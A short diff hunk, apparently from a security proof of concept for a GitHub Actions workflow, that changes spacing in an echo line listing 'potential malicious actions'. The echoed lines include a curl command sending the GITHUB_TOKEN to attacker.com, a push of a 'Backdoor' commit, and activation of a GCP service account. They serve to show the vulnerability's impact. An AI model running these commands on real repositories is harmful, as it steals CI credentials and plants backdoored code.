@@ -94,7 +94,7 @@
                     echo "   - pull-requests: write (can modify PRs)"
                     echo "   - id-token: write (can access OIDC token for GCP)"
                     echo ""
-                    echo "⚠️  POTENTIAL MALICIOUS ACTIONS (NOT EXECUTED IN POC):"
+                    echo "⚠️ POTENTIAL MALICIOUS ACTIONS (NOT EXECUTED IN POC):"
                     echo "   ❌ curl -X POST https://attacker.com/exfil -d \"{\\\"token\\\":\\\"\$GITHUB_TOKEN\\\"}\""
                     echo "   ❌ git commit -am 'Backdoor' && git push"
                     echo "   ❌ gcloud auth activate-service-account (if GCP auth step ran)"
